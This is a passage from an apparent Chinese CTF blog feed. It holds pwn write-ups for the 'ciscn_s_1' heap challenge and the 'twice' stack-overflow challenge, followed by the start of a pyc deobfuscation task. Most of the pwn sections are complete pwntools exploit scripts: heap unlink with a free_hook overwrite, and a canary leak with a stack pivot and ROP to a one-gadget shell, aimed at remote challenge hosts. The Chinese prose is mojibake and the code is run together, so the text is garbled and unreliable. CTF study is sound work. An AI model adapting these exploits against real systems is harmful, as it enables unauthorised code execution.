class="hljs-string">(0x400000)</span></code></pre></div><p>Addå‡½æ•°ï¼šæœ€å¤šå¯ä»¥ç”³è¯·33ä¸ªå †ï¼Œä¸”é—®ä½ å †çš„ç¼–å·ï¼Œå¹¶ä¸”æ ¹æ®è¿™ä¸ªç¼–å·ä½œä¸ºç´¢å¼•ä¸Šbssæ®µæ¥å­˜å‚¨heapçš„åœ°å€ã€‚å¤§å°èŒƒå›´åœ¨<code>0x7f - 0x100</code>ã€‚</p><p>editå‡½æ•°ï¼š</p><div class="hljs"><pre><code class="hljs c">v0[read(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)heap[v2], (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)len[v2])] = <span class="hljs-number">0</span>;</code></pre></div><p>æ˜æ˜¾å­˜åœ¨ç€off by nullã€‚ä¸”æœ‰key1æ§åˆ¶ç€ï¼Œåªèƒ½ç¼–è¾‘2æ¬¡ã€‚</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( key1 == <span class="hljs-number">2</span> )    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</code></pre></div><p>Showå‡½æ•°ï¼š<br>Key2æœ‰å€¼æ‰èƒ½ç”¨ã€‚</p><h4 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><ul><li>ç”±äºæ²¡æœ‰å¼€å¯pieä¿æŠ¤ï¼Œè¿™æ ·æ˜æ˜¾å¯ä»¥unlinkæ”»å‡»ï¼Œç”³è¯·ä¸€ä¸ª32å †å·çš„å †ï¼Œå¤§å°0xf8ï¼Œéƒ½æ˜¯è¶Šå¤§è¶Šå¥½ï¼Œä¸ºäº†ä¸Šé è¿‘key1ã€key2ï¼Œç„¶åè¿›è¡Œæ§åˆ¶.</li></ul><p>å‰©ä¸‹çš„å°±å¾ˆç®€å•äº†ã€‚</p><h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs c">from pwn import *import timelocal_file  = './ciscn_s_1'elf = ELF(local_file)context.log_level = 'debug'debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote('node3.buuoj.cn',29756)    libc = elf.libc    #libc = ELF('.')context.arch = elf.archcontext.terminal = ['tmux','neww']#,''splitw','-h'rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]rce18 = [0x4f2c5,0x4f322,0x10a38c]realloc = [0x2,0x4,0x6,0xB,0xC,0xD]arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, '\0'))uu64    = lambda data               :u64(data.ljust(8, '\0'))info_addr = lambda tag, addr        :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript='b main')    gdb.attach(io)    pause()def add(idx,size,data):    sla('show\n','1')    sla('dex',str(idx))    sla('size',str(size))    sa('content',str(data))def free(idx):    sla('show\n','2')    sla('dex',str(idx))def edit(idx,data):    sla('show\n','3')    sla('dex',str(idx))    sa('content',str(data))def show(idx):    sla('show\n','4')    sla('dex',str(idx))key2 = 0x6022B8for i in range(7):    add(i,0xf8,'aaaaaaaa')add(7,0xf8,"aaaa")#8payload = p64(0) + p64(0x32) + p64(0x6021e0 - 0x18) + p64(0x6021e0 - 0x10) + p64(0) * 2 + p64(0x30)add(32,0xf8,payload)#32add(8,0x88,"aaaa")add(9,0xf8,"aaaa")add(10,0x88,'aaaa')for i in range(7):    free(i+1) # ç”±äº32çš„å †å—ç”³è¯·åç ´åäº†0å·å †å—çš„åœ¨bssä¸Šåœ°å€çš„å‚¨å­˜payload = 'a' * 0x80 + p64(0x180)edit(8,payload)free(9)payload = p64(0) * 3 + p64(0x00000000006021c8) + '\x00'  * (0xf0 - 0x8 * 4) + p64(0x0000000400000001)edit(32,payload)add(11,0x88,' ')show(11)r()libc_base = uu64(r(6)) - 0x3ebf20info_addr('libc_base',libc_base)free_hook = libc_base + 0x3ed8e8rec = rce18[1] + libc_basepayload = p64(0) * 3 + p64(free_hook)edit(32,payload)edit(32,p64(rec))free(11)itr()</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›-twice</title>
    <link href="/2020/06/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%20%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <url>/2020/06/28/%E2%80%9C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E2%80%9D%20%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›"><a href="#â€œç¬¬äº”ç©ºé—´â€-æ™ºèƒ½å®‰å…¨å¤§èµ›" class="headerlink" title="â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›"></a>â€œç¬¬äº”ç©ºé—´â€ æ™ºèƒ½å®‰å…¨å¤§èµ›</h1><p>æ¯”èµ›æ—¶å½“å¤©æœ‰è€ƒè¯•ï¼Œå°±åšäº†ä¸ªç­¾é“é¢˜ã€‚</p><h2 id="twice"><a href="#twice" class="headerlink" title="twice"></a>twice</h2><h3 id="æŸ¥ä¿æŠ¤"><a href="#æŸ¥ä¿æŠ¤" class="headerlink" title="æŸ¥ä¿æŠ¤"></a>æŸ¥ä¿æŠ¤</h3><div class="hljs"><pre><code class="hljs python">Arch:     amd64<span class="hljs-number">-64</span>-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (<span class="hljs-number">0x400000</span>)</code></pre></div><h3 id="idaåˆ†æ"><a href="#idaåˆ†æ" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><ul><li>ç¨‹åºå¯ä»¥ç»™ä½ 2æ¬¡çš„è¯»æ“ä½œï¼Œç¬¬ä¸€æ¬¡è¯»89å­—èŠ‚ï¼Œç¬¬äºŒæ¬¡è¯»112å­—èŠ‚</li><li>æ ˆå¤§å°æ˜¯<code>0x60</code>ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚</li></ul><div class="hljs"><pre><code class="hljs python">0x7fffffffe3b0 --&gt; 0x6097ecbc626822000x7fffffffe3b8 --&gt; 0x6097ecbc626822000128| 0x7fffffffe3c0 --&gt; 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:push   r15)0136| 0x7fffffffe3c8 --&gt; 0x4008ad (&lt;main+50&gt;:test   eax,eax)0144| 0x7fffffffe3d0 --&gt; 0x4008c0 (&lt;__libc_csu_init&gt;:push   r15)0152| 0x7fffffffe3d8 --&gt; 0x7ffff7a2d830 (&lt;__libc_start_main+240&gt;:mov    edi,eax)0160| 0x7fffffffe3e0 --&gt; 0x10168| 0x7fffffffe3e8 --&gt; 0x7fffffffe4b8 --&gt; 0x7fffffffe71f ("/media/psf/mypwn/no5space/pwn")0176| 0x7fffffffe3f0 --&gt; 0x1f7ffcca0</code></pre></div><ul><li>è°ƒè¯•å‘ç°ç¬¬ä¸€æ¬¡readï¼Œå¯ä»¥leak canary å’Œä¸€ä¸ªæ ˆåœ°å€ï¼Œä»è€Œå¯ä»¥æ ¹æ®åç§»ç®—å‡ºæ ˆä¸Šå…¶ä»–æœ‰ç”¨çš„åœ°å€ã€‚</li><li>ç¬¬äºŒæ¬¡ï¼Œéœ€è¦å¡«å……ä¸€ä¸‹canaryï¼Œç„¶åå¯ä»¥å»æ”»å‡»ret address</li></ul><p>ä½†æ˜¯ï¼Œå¹¶æ²¡æœ‰æ‹¿åˆ°libcçš„åœ°å€ï¼Œæ˜¯æ— æ³•æ‹¿åˆ°shellã€‚<strong>ç”±äºå¯ä»¥æº¢å‡ºçš„å­—èŠ‚æœ‰é™ï¼Œä¹Ÿæ²¡æ³•è¿›è¡Œropã€‚</strong></p><h3 id="è·å–libcåœ°å€"><a href="#è·å–libcåœ°å€" class="headerlink" title="è·å–libcåœ°å€"></a>è·å–libcåœ°å€</h3><p>æ­¤æ—¶ï¼Œæ ¹æ®å‰é¢æ³„æ¼çš„æ ˆåœ°å€ï¼Œå¯ä»¥ç®—å‡ºreadå‡½æ•°çš„bufæ ˆåœ°å€ï¼Œç„¶å<strong>æ ˆè¿ç§»</strong>ä¸Šå»ï¼Œç„¶åè¿›è¡Œropæ¥leak å‡ºlibcåœ°å€ã€‚</p><p>æ‹¿åˆ°libcåœ°å€ä»¥åï¼Œropçš„ç»ˆç»“åœ°å€ä¸ºç¨‹åºçš„<code>start</code>ã€‚è®©å…¶æ¸…ç†æ ˆï¼Œå†æ¬¡è¿›è¡Œç¨‹åºçš„æ¼æ´åˆ©ç”¨ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>local_libc  = <span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>remote_libc = local_libc <span class="hljs-comment"># '../libc.so.6</span>context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = ELF(local_libc)<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'121.36.59.116'</span>,<span class="hljs-number">9999</span>)    libc = ELF(remote_libc)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)sea     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-comment"># debug()</span>payload = <span class="hljs-string">"1"</span> * <span class="hljs-number">0x57</span> + <span class="hljs-string">'a'</span>sla(<span class="hljs-string">"&gt;"</span>,payload)ru(<span class="hljs-string">'a'</span>)canary = uu64(r(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x0a</span>print(hex(canary))s_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x70</span>print(hex(s_base))  pop_rsi_pop_r15_ret = <span class="hljs-number">0x0000000000400921</span>pop_rbp_ret = <span class="hljs-number">0x0000000000400690</span>pop_rdi_ret = <span class="hljs-number">0x0000000000400923</span>leave_ret = <span class="hljs-number">0x0000000000400879</span>rop = flat([<span class="hljs-number">0</span>,pop_rdi_ret,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],<span class="hljs-number">0x0400630</span>])payload = rop.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">'\0'</span>)payload += p64(canary) +p64(canary) + p64(s_base) + p64(leave_ret)<span class="hljs-comment"># debug()</span>sa(<span class="hljs-string">"&gt;"</span>,payload)r(<span class="hljs-number">1</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sla(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">'1'</span>)ru(<span class="hljs-string">'1'</span>)rop = flat([<span class="hljs-number">0</span>,pop_rdi_ret,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],<span class="hljs-number">0x0400630</span>])payload = rop.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">'\0'</span>)payload += p64(canary) +p64(canary) + p64(libc_base+rce16[<span class="hljs-number">1</span>]) + p64(libc_base+rce16[<span class="hljs-number">1</span>])sla(<span class="hljs-string">"&gt;"</span>,payload)itr()</code></pre></div><ul><li>æ³¨æ„åœ¨ç¬¬äºŒæ¬¡å‘é€payloadä¸è¦å‘å‡ºå»æ¢è¡Œç¬¦ã€‚</li><li>æœ€åä¸€æ¬¡payload ä¸­çš„ropä»€ä¹ˆçš„éƒ½æ˜¯æŠ„ç¬¬ä¸€æ¬¡çš„payloadï¼Œåªæ˜¯æŠŠæœ€åçš„ret address æ”¹æˆ one gadget ã€‚ï¼ˆåªæ˜¯å¡«å……å­—èŠ‚ç”¨çš„ï¼‰</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTFå®‰æ’æœˆèµ›(6th)</title>
    <link href="/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/"/>
    <url>/2020/06/27/DASCTF%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B(6th)/</url>
    
    <content type="html"><![CDATA[<h1 id="DASCTFå®‰æ’æœˆèµ›-6th"><a href="#DASCTFå®‰æ’æœˆèµ›-6th" class="headerlink" title="DASCTFå®‰æ’æœˆèµ›(6th)"></a>DASCTFå®‰æ’æœˆèµ›(6th)</h1><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="pyCharm-pycæ–‡ä»¶æ¢å¤"><a href="#pyCharm-pycæ–‡ä»¶æ¢å¤" class="headerlink" title="pyCharm(pycæ–‡ä»¶æ¢å¤)"></a>pyCharm(pycæ–‡ä»¶æ¢å¤)</h3><p>è¿™ä¸ªé¢˜åŸºæœ¬å‚è€ƒ<a href="https://www.52pojie.cn/thread-912103-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-912103-1-1.html</a>æ¥åšçš„ã€‚</p><h4 id="åŠ è½½pyc-co-code"><a href="#åŠ è½½pyc-co-code" class="headerlink" title="åŠ è½½pyc co_code"></a>åŠ è½½<code>pyc co_code</code></h4><div class="hljs"><pre><code class="hljs undefined">In [1]: import dis,marshalIn [2]: f=open('1.pyc')In [3]: f.read(4)Out[3]: '<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>'In [4]: f.read(4)Out[4]: 'jv<span class="hljs-symbol">\x</span>e7^'In [5]: code = marshal.load(f)In [6]: code.co_constsOut[6]:(-1, None, 'YamaNalaZaTacaxaZaDahajaYamaIa0aNaDaUa3aYajaUawaNaWaNajaMajaUawaNWI3M2NhMGM=', 'Are u ready?', 0, 32, 'a', '', 'great!waht u input is the flag u wanna get.', 'pity!')In [7]: code.co_varnamesOut[7]: ()In [8]: code.co_namesOut[8]:('base64', 'a', 'raw_input', 'flag', 'b64encode', 'c', 'list', 'd', 'range', 'i', 'join', 'ohh')In [9]: code.co_codeOut[9]: "q<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00q<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>06d<span class="hljs-symbol">\x</span>ffd<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00l<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>00j<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00x'<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00D]<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00c<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>19d<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>007<span class="hljs-symbol">\x</span>03&lt;qI<span class="hljs-symbol">\x</span>00Wd<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00j<span class="hljs-symbol">\n</span><span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00Z<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>00e<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00k<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>00r<span class="hljs-symbol">\x</span>86<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>00GHn<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>00d<span class="hljs-symbol">\t</span><span class="hljs-symbol">\x</span>00GHd<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>00S"</code></pre></div><h4 id="ä½¿ç”¨disåº“å¯¹co-codeè¿›è¡Œåç¼–è¯‘"><a href="#ä½¿ç”¨disåº“å¯¹co-codeè¿›è¡Œåç¼–è¯‘" class="headerlink" title="ä½¿ç”¨disåº“å¯¹co_codeè¿›è¡Œåç¼–è¯‘:"></a>ä½¿ç”¨disåº“å¯¹<code>co_code</code>è¿›è¡Œåç¼–è¯‘:</h4><div class="hljs"><pre><code class="hljs undefined">In [<span class="hljs-number">10</span>]: dis.dis(code.co_code)          <span class="hljs-number">0</span> JUMP_ABSOLUTE       <span class="hljs-number">3</span>    &gt;&gt;    <span class="hljs-number">3</span> JUMP_ABSOLUTE    <span class="hljs-number">1536</span>          <span class="hljs-number">6</span> LOAD_CONST      <span class="hljs-number">25855</span> (<span class="hljs-number">25855</span>)          <span class="hljs-number">9</span> STOP_CODE         <span class="hljs-number">10</span> STOP_CODE         <span class="hljs-number">11</span> LOAD_CONST          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)         <span class="hljs-number">14</span> IMPORT_NAME         <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)         <span class="hljs-number">17</span> STORE_NAME          <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)         <span class="hljs-number">20</span> LOAD_CONST          <span class="hljs-number">2</span> (<span class="hljs-number">2</span>)         <span class="hljs-number">23</span> STORE_NAME          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)         <span class="hljs-number">26</span> LOAD_NAME           <span class="hljs-number">2</span> (<span class="hljs-number">2</span>)         <span class="hljs-number">29</span> LOAD_CONST          <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)         <span class="hljs-number">32</span> CALL_FUNCTION       <span class="hljs-number">1</span>         <span class="hljs-number">35</span> STORE_NAME          <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)         <span class="hljs-number">38</span> LOAD_NAME           <span class="hljs-number">0</span> (<span class="hljs-number">0</span>)         <span class="hljs-number">41</span> LOAD_ATTR           <span class="hljs-number">4</span> (<span class="hljs-number">4</span>)         <span class="hljs-number">44</span> LOAD_NAME           <span class="hljs-number">3</span> (<span class="hljs-number">3</span>)         <span class="hljs-number">47</span> CALL_FUNCTION       <span class="hljs-number">1</span>         <span class="hljs-number">50</span> STORE_NAME          <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)         <span class="hljs-number">53</span> LOAD_NAME           <span class="hljs-number">6</span> (<span class="hljs-number">6</span>)         <span class="hljs-number">56</span> LOAD_NAME           <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)         <span class="hljs-number">59</span> CALL_FUNCTION       <span class="hljs-number">1</span>         <span class="hljs-number">62</span> STORE_NAME          <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)         <span class="hljs-number">65</span> SETUP_LOOP         <span class="hljs-number">39</span> (to <span class="hljs-number">107</span>)         <span class="hljs-number">68</span> LOAD_NAME           <span class="hljs-number">8</span> (<span class="hljs-number">8</span>)         <span class="hljs-number">71</span> LOAD_CONST          <span class="hljs-number">4</span> (<span class="hljs-number">4</span>)         <span class="hljs-number">74</span> LOAD_CONST          <span class="hljs-number">5</span> (<span class="hljs-number">5</span>)         <span class="hljs-number">77</span> CALL_FUNCTION       <span class="hljs-number">2</span>         <span class="hljs-number">80</span> GET_ITER         <span class="hljs-number">81</span> FOR_ITER           <span class="hljs-number">22</span> (to <span class="hljs-number">106</span>)         <span class="hljs-number">84</span> STORE_NAME          <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)         <span class="hljs-number">87</span> LOAD_NAME           <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)         <span class="hljs-number">90</span> LOAD_NAME           <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)         <span class="hljs-number">93</span> DUP_TOPX            <span class="hljs-number">2</span>         <span class="hljs-number">96</span> BINARY_SUBSCR         <span class="hljs-number">97</span> LOAD_CONST          <span class="hljs-number">6</span> (<span class="hljs-number">6</span>)        <span class="hljs-number">100</span> INPLACE_ADD        <span class="hljs-number">101</span> ROT_THREE        <span class="hljs-number">102</span> STORE_SUBSCR        <span class="hljs-number">103</span> JUMP_ABSOLUTE      <span class="hljs-number">73</span>    &gt;&gt;  <span class="hljs-number">106</span> POP_BLOCK    &gt;&gt;  <span class="hljs-number">107</span> LOAD_CONST          <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)        <span class="hljs-number">110</span> LOAD_ATTR          <span class="hljs-number">10</span> (<span class="hljs-number">10</span>)        <span class="hljs-number">113</span> LOAD_NAME           <span class="hljs-number">7</span> (<span class="hljs-number">7</span>)        <span class="hljs-number">116</span> CALL_FUNCTION       <span class="hljs-number">1</span>        <span class="hljs-number">119</span> STORE_NAME         <span class="hljs-number">11</span> (<span class="hljs-number">11</span>)        <span class="hljs-number">122</span> LOAD_NAME          <span class="hljs-number">11</span> (<span class="hljs-number">11</span>)        <span class="hljs-number">125</span> LOAD_NAME           <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)        <span class="hljs-number">128</span> COMPARE_OP          <span class="hljs-number">2</span> (==)        <span class="hljs-number">131</span> POP_JUMP_IF_FALSE   <span class="hljs-number">134</span>    &gt;&gt;  <span class="hljs-number">134</span> LOAD_CONST          <span class="hljs-number">8</span> (<span class="hljs-number">8</span>)        <span class="hljs-number">137</span> PRINT_ITEM        <span class="hljs-number">138</span> PRINT_NEWLINE        <span class="hljs-number">139</span> JUMP_FORWARD        <span class="hljs-number">5</span> (to <span class="hljs-number">147</span>)        <span class="hljs-number">142</span> LOAD_CONST          <span class="hljs-number">9</span> (<span class="hljs-number">9</span>)        <span class="hljs-number">145</span> PRINT_ITEM        <span class="hljs-number">146</span> PRINT_NEWLINE    &gt;&gt;  <span class="hljs-number">147</span> LOAD_CONST          <span class="hljs-number">1</span> (<span class="hljs-number">1</span>)        <span class="hljs-number">150</span> RETURN_VALUE</code></pre></div><p>è¿™é‡Œé¢éœ€è¦æ³¨æ„çš„å°±æ˜¯å¼€å¤´çš„ï¼š</p><div class="hljs"><pre><code class="hljs undefined">      <span class="hljs-number">0</span> JUMP_ABSOLUTE       <span class="hljs-number">3</span>&gt;&gt;    <span class="hljs-number">3</span> JUMP_ABSOLUTE    <span class="hljs-number">1536</span>      <span class="hljs-number">6</span> LOAD_CONST      <span class="hljs-number">25855</span> (<span class="hljs-number">25855</span>)      <span class="hljs-number">9</span> STOP_CODE     <span class="hljs-number">10</span> STOP_CODE</code></pre></div><p>æ˜æ˜¾åŠ å…¥äº†æ··æ·†ï¼Œæ€ä¹ˆçªç„¶å°±åœæ­¢äº†<code>STOP_CODE</code>ã€‚æ¥ç€å°±æ˜¯æƒ³åŠæ³•å»é™¤è¿™äº›æ··æ·†ï¼Œå’Œä¿®æ­£<code>co_code</code>é•¿åº¦ï¼ŒæœŸæœ›ä¿®æ”¹åçš„opcodeé¦–è¡Œä¸º</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>LOAD_CONST <span class="hljs-number">0</span>(<span class="hljs-number">0</span>)<span class="hljs-symbol">1 </span>LOAD_CONST <span class="hljs-number">1</span>(<span class="hljs-number">1</span>)</code></pre></div><p>å…¶ä¸­è¿™ç§äºŒè¿›åˆ¶å­—èŠ‚ç å¯¹åº”çš„ç¿»è¯‘ç»“æœï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0x64</span> æ“ä½œä¸ºLOAD_CONSTï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šLOAD_CONST <span class="hljs-number">1</span>        HEX: <span class="hljs-number">640100</span><span class="hljs-number">0x71</span> æ“ä½œä¸ºJUMP_ABSOLUTEï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šJUMP_ABSOLUTE <span class="hljs-number">14</span>                HEX: <span class="hljs-number">710e00</span><span class="hljs-number">0x65</span> æ“ä½œä¸ºLOAD_NAMEï¼Œç”¨æ³•ä¸¾ä¾‹ï¼šLOAD_NAME <span class="hljs-number">1</span>                HEX: <span class="hljs-number">650100</span></code></pre></div><p>æ‰€ä»¥å¯»æ‰¾ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>LOAD_CONST <span class="hljs-number">0</span>(<span class="hljs-number">0</span>)</code></pre></div><p>å³ä¸ºå¯»æ‰¾<code>HEX : 640000</code>è¿™ä¸ªä½œä¸ºæ··æ·†å­—æ®µç»“æŸã€‚<br>å¼€å¤´æ€ä¹ˆå¯»æ‰¾å‘¢ã€‚ç”±äºçœ‹å‰é¢3ä¸ªå­—èŠ‚å¯¹åº”ä¸€ä¸ªå«ä¹‰ï¼ŒçŒœæµ‹ï¼š</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-symbol">0 </span>JUMP_ABSOLUTE       <span class="hljs-number">3</span></code></pre></div><p>ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼ï¿¼<br>ï¿¼ï¿¼ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/UceCOc.jpg" srcset="/img/loading.gif" alt></p><p>é‚£å¾ˆæ˜æ˜¾æ··æ·†å­—æ®µå°±æ˜¯ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/bKDIpN.png" srcset="/img/loading.gif" 